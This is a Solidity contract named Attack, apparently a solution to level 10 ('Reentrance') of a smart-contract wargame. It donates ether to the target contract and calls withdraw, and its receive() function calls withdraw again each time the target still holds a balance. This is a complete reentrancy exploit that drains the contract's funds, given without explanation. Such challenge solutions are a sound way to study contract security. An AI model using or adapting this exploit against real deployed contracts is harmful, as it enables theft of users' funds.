// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Level10.sol";

contract Attack {
    function attackReentrance(address payable _instance) public payable {
        Reentrance instance = Reentrance(_instance);
        instance.donate{value: msg.value}(address(this));
        instance.withdraw(msg.value);
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            Reentrance(payable(msg.sender)).withdraw(msg.value);
        }
    }
}
